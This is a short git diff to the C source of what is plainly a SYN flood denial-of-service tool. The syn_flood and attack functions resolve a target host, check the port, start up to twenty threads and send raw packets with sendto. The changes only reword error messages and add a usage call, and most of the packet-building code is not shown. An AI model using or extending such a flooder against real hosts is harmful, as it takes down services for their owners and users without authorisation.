@@ -1,4 +1,5 @@
 #include "protocol.h"
+#include "usages.h"
 
 #define MAX_TH_N 20
 
@@ -31,7 +32,8 @@ int syn_flood(int argc, ...) {
 
     if(th_n>MAX_TH_N || th_n<=0)
     {
-        printf("Level error\n");
+        printf("-l option input error\n");
+        usage_as();
         return -1;
     }
 
@@ -47,7 +49,7 @@ int syn_flood(int argc, ...) {
             }
             else
             {
-                printf("Usage error\n");
+                usage_as();
                 return -1;
             }
             break;
@@ -60,13 +62,13 @@ int syn_flood(int argc, ...) {
 
     if(hostname_to_ip(inputData, &t_ip)<0)
     {
-        printf("%s host not found, check hostname\n",inputData);
+        printf("\"%s\" host not found, check hostname\n", inputData);
         return -1;
     }
 
     if(t_port<=0 || t_port>65535)
     {
-        printf("Port error\n");
+        printf("Port insert error\n");
         return -1;
     }
     
@@ -75,7 +77,7 @@ int syn_flood(int argc, ...) {
     t_addr.sin_port = htons((uint16_t)t_port);
     t_addr.sin_family = AF_INET;
 
-    printf("%s:%d Syn flooding...\n",inet_ntoa(t_addr.sin_addr), t_port);
+    printf("\n===== %s:%d Syn flooding... =====\n\n",inet_ntoa(t_addr.sin_addr), t_port);
     for(int n = 0 ; n<th_n ; n++)
     {
         th_arg[n].sock = make_socket();
@@ -132,9 +134,9 @@ int attack(int sock, struct sockaddr_in *addr)
         
 		if(sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr *)addr, sizeof(struct sockaddr_in))<0)
         {
-            perror("sendto");
+            perror("sendto ");
             return -1;
-        }    
+        } 
     }
 }
 
